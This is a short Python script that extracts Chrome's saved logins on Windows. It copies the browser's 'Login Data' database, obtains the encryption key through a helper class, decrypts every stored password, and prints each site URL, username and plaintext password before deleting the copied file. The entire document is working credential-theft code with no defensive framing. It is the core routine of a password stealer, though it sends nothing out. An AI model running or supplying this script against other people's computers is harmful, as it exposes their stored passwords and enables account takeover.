import os
import sqlite3
import shutil
from chrome_password import ChromePassword


def main():
    chrome_password: ChromePassword = ChromePassword()
    key = chrome_password.fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = chrome_password.password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_password.chrome_date_and_time(date_of_creation))}")

        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(chrome_password.chrome_date_and_time(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()

    try:
        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()
